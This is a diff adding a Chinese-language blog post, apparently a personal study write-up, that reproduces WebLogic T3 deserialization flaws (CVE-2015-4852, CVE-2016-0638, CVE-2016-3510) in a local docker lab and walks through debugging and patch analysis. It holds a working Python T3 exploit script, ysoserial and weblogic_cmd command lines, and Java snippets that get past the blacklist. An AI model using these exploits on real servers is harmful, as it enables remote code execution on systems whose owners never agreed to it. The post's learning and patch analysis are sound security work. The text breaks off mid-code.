@@ -1,0 +1,533 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020"/>
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="weblogic," />
+  
+
+  
+    <meta name="description" content="weblogic反序列化漏洞复现" />
+  
+  
+  <link rel="icon" type="image/x-icon" href="/logo.png">
+  <title>weblogic反序列化漏洞复现 [ las ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    <img class="avatar" src="http://localhost:4000/images/logo.png">
+    <span class="title">las</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            <li class="pure-menu-item"><a href="/" class="pure-menu-link">Home</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">Archives</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/tags" class="pure-menu-link">Tags</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/categories" class="pure-menu-link">Categories</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/about" class="pure-menu-link">About</a></li>
+          
+      
+  </ul>
+   
+</nav>
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        weblogic反序列化漏洞复现
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2020-12-02T03:20:32.000Z">
+        2020-12-02
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/weblogic/" rel="tag">weblogic</a></li></ul>
+      </span>
+    </span>
+      <span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>
+      <span class="read">阅读耗时 25 分钟</span>
+    </header>
+
+    <div class="post-content">
+      <h1 id="weblogic反序列化漏洞复现"><a href="#weblogic反序列化漏洞复现" class="headerlink" title="weblogic反序列化漏洞复现"></a>weblogic反序列化漏洞复现</h1><blockquote>
+<p>更新ing… 目前停滞在了<strong>CVE-2017-3248</strong>，需要重新学一下rmi和ysoserial相关模块。</p>
+</blockquote>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="关于weblogic"><a href="#关于weblogic" class="headerlink" title="[-]关于weblogic"></a>[-]关于weblogic</h3><h3 id="t3协议"><a href="#t3协议" class="headerlink" title="t3协议"></a>t3协议</h3><p>WebLogic Server 中的 RMI 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。</p>
+<p>在调用一个方法时，客户端要发送两次数据：</p>
+<ol>
+<li>请求包</li>
+<li>请求主体（包含序列化对象）</li>
+</ol>
+<p>其中，请求包发送的内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;t3 10.3.6.0\nAS:255\nHL:19\n\n&#39;</span><br></pre></td></tr></table></figure>
+
+<p>经过测试，这里的版本号似乎是可以随便替换的，因为实际使用的版本体现在<strong>请求主体</strong>中。</p>
+<p>客户端接受到的响应为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;HELO:10.3.6.0.false\nAS:2048\nHL:19\n\n&#39;</span><br></pre></td></tr></table></figure>
+
+<p>通过响应，能够判断服务端版本也是<code>10.3.6.0</code>。</p>
+<p>接下来客户端可以发送<strong>请求主体</strong>了。服务端收到请求主体后就会将客户端发送的序列化对象进行反序列化。</p>
+<p>请求主体的组成部分为：<strong>长度+请求头+序列化对象</strong>。如下图。需要注意的是，序列化数据是不固定的，有的情况下可能是6个，有时是7个等等。</p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201201163202627.png" alt="image-20201201163202627"></p>
+<p>在每个序列化对象数据（以<code>aced</code>开头）前，会添加一段标志数据即<code>fe010000</code>。</p>
+<p>一个<strong>请求主体</strong>数据包的实例：</p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201201164048618.png" alt="s"></p>
+<p>由于Weblogic不是开源软件，无法找到对T3协议的标准定义（在复现CVE-2016-0638时用到的脚本里能够看到一些协议的蛛丝马迹），实际在构造poc的时候，一般会抓取一个实际的流量截取其请求头。我们只需手动修改长度和序列化对象就行了。</p>
+<h2 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>weblogic反序列化的起点，在T3协议中，weblogic服务端对于客户端发送的所有序列化对象都会进行反序列化。ysoserial的出现让命令执行变成了现实。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><strong>漏洞环境搭建</strong></p>
+<ol>
+<li><p>首先上<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">vulnhub</a>下载复现项目。</p>
+</li>
+<li><p>vulnhub没有单独为<strong>CVE-2015-4852</strong>写docker，使用<strong>CVE-2018-2628</strong>即可，</p>
+<p>由于要开启debug，可以直接在外部配置好。编辑<strong>Dockerfile</strong>：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> vulhub/weblogic:<span class="number">10.3</span>.<span class="number">6.0</span>-<span class="number">2017</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> debugFlag true</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">7001</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8453</span></span><br></pre></td></tr></table></figure>
+
+<p>修改docker-compose.yml：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"> <span class="attr">weblogic:</span></span><br><span class="line">   <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">   <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;7001:7001&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;8453:8453&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来<code>docker-compose up -d</code>启动即可。</p>
+</li>
+</ol>
+<p><strong>调试环境搭建</strong></p>
+<ol>
+<li><p>要调试weblogic需要拷贝源码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker cp xxxxxx:/root ./weblogic_jars</span><br><span class="line">cd ./weblogic_jars/Oracle/Middleware</span><br><span class="line">mkdir test</span><br><span class="line">find ./ -name &quot;*.jar&quot; -exec cp &#123;&#125; ./test/ \;</span><br><span class="line">find ./ -name &quot;*.war&quot; -exec cp &#123;&#125; ./test/ \;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将<code>./weblogic_jars/Oracle/Middleware/wlserver_10.3</code>作为IDEA项目打开，</p>
+<p>设置<strong>Project-structrue–&gt;Platform Settings–&gt;SDKS</strong>为<code>./weblogic_jars/jdk/</code>下的jdk：</p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201201191942539.png" alt="image-20201201191942539"></p>
+<p>设置<strong>Project-structrue–&gt;Project Settings–&gt;Libraries</strong>为之前拷贝的test目录：</p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201201191931382.png" alt="pic"></p>
+</li>
+<li><p>添加一个<strong>Remote</strong>调试项目，设置好ip和端口：</p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201129154835090.png" alt="im"></p>
+</li>
+<li><p>启动项目，成功后会显示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connected to the target VM, address: &#39;localhost:8453&#39;, transport: &#39;socket&#39;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<hr>
+<p>此部分环境搭建参考<del>照抄</del>P神知识星球文章：Java安全初探-XMLDecoder与Weblogic.pdf。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p> 使用ysoserial.jar生成恶意的对象：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections1 &quot;touch /tmp/lases&quot; &gt; poc.bin</span><br></pre></td></tr></table></figure>
+
+<p>执行下述脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">ip, port, file</span>):</span></span><br><span class="line"></span><br><span class="line">    t3_header = <span class="string">&#x27;t3 10.3.6\nAS:255\nHL:19\n\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    host = (ip, <span class="built_in">int</span>(port))</span><br><span class="line"></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">15</span>)</span><br><span class="line">    sock.connect(host)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send t3 header</span></span><br><span class="line">    sock.sendall(t3_header.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    resp1 = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">&quot;resp-part1:\n&quot;</span> + <span class="built_in">str</span>(resp1))</span><br><span class="line">    resp2 = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">&quot;resp-part2:\n&quot;</span> + <span class="built_in">str</span>(resp2))</span><br><span class="line">    data1 = <span class="string">&#x27;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># second payload</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        payload = binascii.b2a_hex(f.read()).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = data1 + payload</span><br><span class="line">    data = <span class="string">&#x27;%s%s&#x27;</span> % (<span class="string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(data) // <span class="number">2</span> + <span class="number">4</span>), data)</span><br><span class="line">    sock.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp(<span class="string">&#x27;192.168.242.128&#x27;</span>,<span class="string">&#x27;7001&#x27;</span>,<span class="string">&#x27;poc.bin&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>执行结果：</p>
+<img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201129192117386.png" alt="ans" style="zoom:50%;" />
+
+<p>可以看到，我们的exp中首先伪造发送了t3协议头<code>t3 10.3.6\nAS:255\nHL:19\n\n</code>，且这里的版本我随便修改发现无伤大雅，如可用：<code>t3 15.3.3\nAS:255\nHL:19\n\n</code>。猜测这里只是协商版本，最终使用的实际协议在第二个数据包进行体现。</p>
+<p>接着构造的第二个数据包由<strong>头部4字节长度+协议头+对象</strong>组成。</p>
+<h3 id="漏洞详解"><a href="#漏洞详解" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>断点下在<code>weblogic.rjvm.InboundMsgAbbrev</code>的<code>read()</code>函数处，对象的反序列化最终会进入这个函数。</p>
+<p>然后执行poc脚本，开始调试：</p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201201202119518.png" alt="image-20201201202119518"></p>
+<p>此处的<code>numAbbrevs=in.readLength();</code>是去读取此次数据中的待反序列化的对象个数，然后在接下来for循环中对每一个对象进行实例化。</p>
+<p>参数<code>in.head</code>中可以查看到我们的发送的反序列化数据包：</p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201129180023204.png" alt="data"></p>
+<p>由于poc中第一个对象就是构造的CC1恶意对象，于是我们进入循环的第一个<code>this.readObject(in)</code>：</p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201201202406899.png" alt="img"></p>
+<p>这里最后读取到的<code>typecode</code>值为0，于是进入了<code>return (new Inbound...).readObject();</code>。而这个<code>ServerChannelInputStream</code>没有重写<code>readObject</code>方法，所以最后调用的是原始的<code>ObjectInputStream</code>的<code>readObject</code>方法。接着就是常规的CC链了，这里不再继续跟进。</p>
+<hr>
+<p>由于weblogic在7001端口    同时处理了http、t3等协议，本来是想跟进一下它是如何进行多路复用的，但受困于资料缺乏、能力不足，计划暂时搁浅。过程中得知的一个关键对象是<code>SocketMuxer</code>，这里留下链接，为以后继续探究做准备：</p>
+<p>从<code>socketMuxer</code>开始的分析：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201432#h2-5">https://www.anquanke.com/post/id/201432#h2-5</a></p>
+<p>从<code>InboundMsgAbbrev.read()</code>开始更详尽的分析：<a target="_blank" rel="noopener" href="https://my.oschina.net/u/4587690/blog/4536037">https://my.oschina.net/u/4587690/blog/4536037</a></p>
+<h3 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h3><ul>
+<li>10.3.6.0</li>
+<li>12.1.2.0</li>
+<li>12.1.3.0</li>
+<li>12.2.1.0</li>
+</ul>
+<h3 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h3><p>官方漏洞通报时发布了两个补丁：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://updates.oracle.com/Orion/PatchDetails/handle_rel_change?release=8191036001202&plat_lang=2000P&aru=19587063&patch_num=22248372&patch_num_id=2365750">p22248372_1036012_Generic</a></li>
+<li><a target="_blank" rel="noopener" href="https://updates.oracle.com/Orion/PatchDetails/process_form?patch_num=20780171">p20780171_1036_Generic</a></li>
+</ul>
+<p>后来又有集成补丁<a target="_blank" rel="noopener" href="https://updates.oracle.com/Orion/PatchDetails/process_form?patch_num_id=&patch_num=21984589&release=8191036000&plat_lang=2000P&no_header=0&">p21984589_1036_Generic</a>。</p>
+<p>这里只找到前两个补丁的链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1hrGJNNI%E3%80%82">https://pan.baidu.com/s/1hrGJNNI。</a></p>
+<p>网上的说法是修复了三个地方：</p>
+<ul>
+<li>weblogic.rjvm.InboundMsgAbbrev.class</li>
+<li>weblogic.rjvm.MsgAbbrevInputStream.class</li>
+<li>weblogic.iiop.Utils.class</li>
+</ul>
+<p>但我打了<strong>p22248372</strong>和<strong>p20780171</strong>两个补丁，并没有发现<code>weblogic.iiop.Utils</code>有任何变化：</p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201201194147535.png" alt="img"></p>
+<p>只有前两者有修复：</p>
+<ul>
+<li><p>inboundMsgAbbrev：</p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201201194631195.png" alt="image-20201201194631195"></p>
+</li>
+<li><p>MsgAbbrevInputStream：</p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201201194757466.png" alt="msgAbbrevInputStream"></p>
+</li>
+</ul>
+<p>可以看到是以黑名单形式修复的。</p>
+<p>BLACK_LIST的内容：</p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201201195158539.png" alt="black_list"></p>
+<p>判断黑名单的逻辑：</p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201201195435495.png" alt="sss"></p>
+<p>这样，对于<code>org.apache.commons.collections.functors</code>下的各种<code>transformer</code>就行不通了。</p>
+<p>向打补丁后的weblogic再次发送poc，发现执行不通。</p>
+<p>查看一下日志：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log00001</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201201201710776.png" alt="log"></p>
+<hr>
+<p><strong>修复原理</strong></p>
+<p>在对象的反序列化过程中，会在某个环节下调用<code>resolveClass</code>方法。</p>
+<p>这个函数会通过一个数据结构来获得将要反序列化的对象的<code>Class</code>对象，如果</p>
+<blockquote>
+<p>关于java序列化数据格式，更详细的参考这篇文章：<a target="_blank" rel="noopener" href="https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md">https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md</a></p>
+<p>关于<code>resolveClass</code>作用分析：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8443">https://xz.aliyun.com/t/8443</a></p>
+</blockquote>
+<p>由于<code>ServerChannelInputStream</code>重写了<code>resolveClass</code>方法，而该方法原本的作用是在调用了<code>readDesc=readClassDescriptor()</code>之后，将<code>readDesc</code>转换为一个Class对象，便于后续还原出原始对象：</p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201129183819078.png"></p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201129183706820.png" alt="resolveclass"></p>
+<p>而weblogic的修复，就是在<code>ServerChannelInputStream</code>重写的<code>resolveClass</code>方法处增加了黑名单。连Class对象都生成不了，自然是不能够执行<code>&lt;clinit&gt;</code>方法的：</p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201129183212578.png" alt="ss"></p>
+<h2 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><strong>CVE-2016-0638</strong>是基于上一个漏洞补丁中黑名单的绕过。它没有直接在<code>ServerChannelInputStream</code>中对恶意载荷进行反序列化，而是选择了一个载体，它会新建一个<code>ObjectInputStream</code>来对CC链反序列化以避免<code>ServerChannelInputStream.resolveClass()</code>中黑名单的处理。</p>
+<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><strong>实验环境</strong></p>
+<p>为了更真实的查看到补丁的修复情况，我基于<strong>CVE-2015-4852</strong>的镜像打了补丁，步骤有些繁琐，参见<a target="_blank" rel="noopener" href="https://www.twblogs.net/a/5b8dedca2b71771883419f60/zh-cn">链接</a>。当然我自己也基于vulnhub做了镜像，拉下来可以直接用：<code>docker pull 478942543/weblogic:CVE-2016-0638</code>。</p>
+<p><strong>调试环境搭建</strong></p>
+<p>搭建步骤和<strong>CVE-2015-4852</strong>一样，如果用我的镜像调试能够看到修复后的代码。</p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现<strong>CVE-2016-0638</strong>使用的poc脚本是github项目：<a target="_blank" rel="noopener" href="https://github.com/5up3rc/weblogic_cmd">https://github.com/5up3rc/weblogic_cmd</a></p>
+<p>项目本身没有使用maven，于是尝试手动打包。记录一下过程。手动打jar包次数太少了得多练练。</p>
+<ol>
+<li><p>进入项目<code>根目录/src</code>下，执行<code>mkdir ../target</code></p>
+</li>
+<li><p>编译java文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -encoding utf-8 -cp .;..\lib\wlcipher.jar;..\lib\commons-cli-1.4.jar;..\lib\commons-collections-3.1.jar;..\lib\jsafeFIPS.jar;..\lib\wlcipher.jar;..\lib\wlfullclient.jar -d ../target .\weblogic\jms\common\*.java .\weblogic\security\utils\*.java .\weblogic\socket\ChannelSSLSocketFactory.java</span><br></pre></td></tr></table></figure>
+
+<p>注意这里jar包貌似只能一个个指定，通配符或者目录不管用（windows下）。同时不同目录下的.java文件也是。</p>
+</li>
+<li><p><code>cd ../target</code></p>
+</li>
+<li><p>创建<code>MANIFEST.MF</code>文件：</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Manifest-Version</span>: <span class="string">1.0</span></span><br><span class="line"><span class="meta">Main-Class</span>: <span class="string">com.supeream.Main</span></span><br><span class="line"><span class="meta">Class-Path</span>: <span class="string">../lib/commons-cli-1.4.jar ../lib/commons-collections-3.1.jar ../lib/jsafeFIPS.jar ../lib/wlcipher.jar ../lib/wlfullclient.jar</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>打包：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvfm weblogic_cmd.jar MANIFEST.MF *</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>接下来就可以运行了，由于<code>MANIFEST.MF</code>中指定了相对的jar路径，因此该jar包不能够放到别的路径运行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar weblogic_cmd.jar -H &quot;192.168.242.128&quot; -C &quot;touch /tmp/lases&quot; -B -os linux</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<h3 id="漏洞详解-1"><a href="#漏洞详解-1" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>由于修复补丁重写了<code>ServerChannelInputStream</code>的<code>resolveClass</code>，一个绕过思路是，使用一个能够经过<code>resolveClass</code>黑名单检测的载体，载体能在自己的<code>readObject</code>或者<code>readExternal</code>方法里面创建<code>ObjectInputStream</code>对象然后调用<code>readObject</code>对恶意类进行序列化。由于原始的<code>ObjectInputStream</code>的<code>resolveClass</code>是没有黑名单的（weblogic不可能去修复jdk包的），因此达到反序列化恶意类的目的。</p>
+<p>在这种思路下，<strong>CVE-2016-0638</strong>使用了<code>weblogic.jms.common.StreamMessageImpl</code>来绕过黑名单。由于它继承的是<code>Externalizable</code>接口，反序列化只看其<code>readExternal</code>方法。如下：</p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201201083424295.png" alt="sss"></p>
+<p>可以看到，在<code>var1.readFully(this.buffer);</code>处<code>StreamMessageImpl</code>将写在序列化数据中的字节读到了buffer中然后进行了反序列化。</p>
+<p>再看看其<code>writeExternal</code>方法：</p>
+<p><img src="C:\Users\47894\AppData\Roaming\Typora\typora-user-images\image-20201201085035025.png" alt="image-20201201085035025"></p>
+<p>于是按照下述步骤构造T3协议第二步中传递的序列化对象：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">StreamMessageImpl StreamMessage = <span class="keyword">new</span> StreamMessageImpl();</span><br><span class="line">StreamMessage.setDataBuffer(payload, payload.length); <span class="comment">// payload就是CC链序列化后的字节</span></span><br><span class="line">Serializables.serialize(StreamMessage);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="适用版本-1"><a href="#适用版本-1" class="headerlink" title="[-] 适用版本"></a>[-] 适用版本</h3><p>小版本不详。</p>
+<h3 id="修复方式-1"><a href="#修复方式-1" class="headerlink" title="[-] 修复方式"></a>[-] 修复方式</h3><p>感觉又增加了黑名单？ 不详。</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.chabug.org/audit/1184.html">https://www.chabug.org/audit/1184.html</a></p>
+<h2 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h2><p>参考链接：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8529#toc-0">https://xz.aliyun.com/t/8529#toc-0</a></p>
+<h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>仍然是基于<strong>CVE-2015-4852</strong>补丁的绕过。思路同<strong>CVE-2016-0638</strong>是一样的。</p>
+<p>这里用的环境和脚本都和上一个漏洞一样。</p>
+<h3 id="漏洞详解-2"><a href="#漏洞详解-2" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p><strong>CVE-2016-3510</strong>选用的载体是<code>weblogic.corba.utils.MarshalledObject</code>，不同的地方是，它没有编写<code>writeObject</code>和<code>readObject</code>方法。利用的地方在它的<code>readResolve</code>方法：</p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201202083248159.png" alt="image-20201202083248159"></p>
+<p>可以看出，如果能够在反序列化的过程中调用到<code>readResolve</code>方法，就能对<code>this.objBytes</code>这个字节数组进行反序列化。</p>
+<p>再看一眼它的构造函数：</p>
+<p><img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201202083440571.png" alt="image-20201202083440571"></p>
+<p>所以我们在构造的时候只需将恶意的<code>AnnoInvocationHandler</code>传递到它的构造函数即可：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MarshalledObject marshalledObject = <span class="keyword">new</span> MarshalledObject(payload);</span><br><span class="line">Serializables.serialize(marshalledObject);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>现在的问题是，反序列化时是怎样调用到<code>readResolve</code>方法的？</p>
+<p>其实是在<code>ObjectInputStream</code>的<code>readOrdinaryObject</code>方法里：</p>
+<img src="https://gitee.com/Lieutenantas/md-pic/raw/master/image-20201202085957947.png" alt="readOrdinaryObject" style="zoom:50%;" />
+
+<p>这里的<code>desc.invokeReadResolve</code>会通过反射去调用<code>marshallObject</code>上的<code>readResolve</code>方法，从而完成恶意对象的反序列化。</p>
+<hr>
+<p>一个题外话是，<code>readResolve</code>方法在实际的反序列化中起到了什么作用？</p>
+<p>其目的是为了解决在<strong>单例模式</strong>中直接反序列化会破坏单例结构的问题。看一个例子：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton SINGLETON = <span class="keyword">new</span> Singleton();</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span 